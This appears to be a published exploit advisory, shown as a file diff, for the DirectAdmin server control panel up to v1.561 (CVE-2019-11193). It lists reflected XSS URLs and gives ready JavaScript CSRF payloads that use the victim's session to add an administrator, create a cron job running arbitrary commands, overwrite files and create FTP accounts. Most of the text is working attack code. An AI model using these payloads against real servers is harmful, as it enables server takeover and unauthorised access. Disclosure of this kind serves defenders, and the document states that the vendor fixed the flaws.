@@ -1,0 +1,69 @@
+# Title: DirectAdmin Multiple Vulnerabilities to Takeover the Server <= v1.561
+# Date: 12.04.2019
+# Author: InfinitumIT
+# Vendor Homepage: https://www.directadmin.com/
+# Version: Up to v1.561.
+# CVE: CVE-2019-11193
+# info@infinitumit.com.tr && infinitumit.com.tr
+
+# Description:
+# Multiple security vulnerabilities has been discovered in popular server control panel DirectAdmin, by
+# InfinitumIT. Attackers can combine those security vulnerabilities and do a lot of critical action like server control takeover.
+# Those vulnerabilities (Cross Site Scripting and Cross Site Request Forgery) may cause them to happen:
+# Add administrator, execute command remote (RCE), Full Backup the Server and Upload the Own Server, webshell upload and more.
+
+# Reflected XSS Vulnerabilities:
+# https://SERVERIP:2222/CMD_FILE_MANAGER/XSS-PAYLOAD
+# https://SERVERIP:2222/CMD_SHOW_USER?user=XSS-PAYLOAD
+# https://SERVERIP:2222/CMD_SHOW_RESELLER?user=XSS-PAYLOAD
+
+# Example Payloads:
+# Add Administrator:
+var url = "http://SERVERIP:2222/CMD_ACCOUNT_ADMIN";
+var params =
+"fakeusernameremembered=&fakepasswordremembered=&action=create&username=username&emai
+l=test%40test.com&passwd=password&passwd2=password&notify=ye";
+var vuln = new XMLHttpRequest();
+vuln.open("POST", url, true);
+vuln.withCredentials = 'true';
+vuln.setRequestHeader("Content-type",
+"application/x-www-form-urlencoded");
+vuln.send(params);
+
+# Remote Command Execution by Cron Jobs:
+var url = "http://SERVERIP:2222/CMD_CRON_JOBS";
+var params =
+"action=create&minute=*&hour=*&dayofmonth=*&month=*&dayofweek=*&command=command";
+var vuln = new XMLHttpRequest();
+vuln.open("POST", url, true);
+vuln.withCredentials = 'true';
+vuln.setRequestHeader("Content-type",
+"application/x-www-form-urlencoded");
+vuln.send(params);
+
+# Edit File:
+var url = "http://SERVERIP:2222/CMD_ADMIN_FILE_EDITOR";
+var params = "file=the-file-full-path&action=save&text=new-content";
+var vuln = new XMLHttpRequest();
+vuln.open("POST", url, true);
+vuln.withCredentials = 'true';
+vuln.setRequestHeader("Content-type",
+"application/x-www-form-urlencoded");
+vuln.send(params);
+
+# Create FTP Account:
+var url = "http://SERVERIP:2222/CMD_FTP";
+var params =
+"fakeusernameremembered=&fakepasswordremembered=&action=create&domain=infinitumit.com.tr
+&user=username&passwd=password&random=Save+Password&passwd2=password&type=domain&cu
+stom_val=%2Fhome%2Fusername&create=Create";
+var vuln = new XMLHttpRequest();
+vuln.open("POST", url, true);
+vuln.withCredentials = 'true';
+vuln.setRequestHeader("Content-type",
+"application/x-www-form-urlencoded");
+vuln.send(params);
+
+
+# Vulnerabilities are fixed in minutes, thanks to DirectAdmin.
+# InfinitumIT / For safer days...
